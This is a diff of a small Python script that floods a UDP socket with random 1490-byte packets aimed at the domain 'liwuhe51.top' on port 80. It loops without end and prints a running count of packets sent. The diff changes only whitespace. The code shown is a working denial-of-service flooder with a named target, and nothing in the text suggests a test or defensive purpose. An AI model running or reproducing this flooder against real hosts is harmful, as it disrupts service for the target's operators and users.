@@ -1,4 +1,3 @@
-
 # Import.
 from datetime import timedelta
 from   platform import system
@@ -14,7 +13,6 @@ import datetime
 sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 
-
 # Get ip.
 url = "liwuhe51.top"
 #ip = socket.gethostbyname(url)
@@ -29,7 +27,7 @@ port = 80
 if i == 1:
     try:
         while True:
-            if i == 65535:                
+            if i == 65535:
                 exit()
 
             sock.sendto(bytes, (str(ip), port))
@@ -38,7 +36,6 @@ if i == 1:
             now = datetime.datetime.now()
             dtime = now.strftime("%Y-%m-%d %H:%M:%S")
             print('\033[32;1m[%s]Sented %s packets to %s through port:%s\033[0m'%(dtime, sent, ip, port))  
-            
             
     except:
         print('\n\033[31;1mExited\033[0m')
